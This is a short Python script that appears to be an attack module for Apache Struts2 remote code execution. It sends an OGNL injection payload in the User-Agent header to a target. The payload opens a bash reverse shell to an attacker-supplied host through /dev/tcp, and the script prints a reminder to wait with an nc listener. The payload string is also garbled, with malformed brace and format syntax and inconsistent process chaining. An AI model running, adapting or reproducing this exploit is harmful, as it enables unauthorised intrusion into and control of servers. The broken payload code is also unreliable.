import requests
import time

def struts2_exploit(target, lhost, lport):
    payload = "%{(#_='multipart/form-data',#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container'],#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class),#ognlUtil.getExcludedPackageNames().clear(),#ognlUtil.getExcludedClasses().clear(),#context.setMemberAccess(#dm)),(#a=@java.lang.Runtime@getRuntime().exec('bash -c {bash,-i,&/dev/tcp/{}/{},<{{bash,-i,&/dev/tcp/{}/{}}}}'.format(lhost,lport,lhost,lport))).(#b=@java.lang.ProcessBuilder@new(#a).(#c=@java.lang.ProcessBuilder@new('bash','-c','bash -i >& /dev/tcp/{}/{} 0>&1'.format(lhost,lport))).start())))"
    
    headers = {'User-Agent': payload}
    try:
        requests.get(f"http://{target}", headers=headers, timeout=10)
        print(f"[+] Struts2 payload sent to {target}:{lport}")
        print("[*] Check nc -lvnp {}".format(lport))
    except:
        pass

def run(target, lhost, lport=4444):
    print(f"[+] RCE module: {target}")
    struts2_exploit(target, lhost, lport)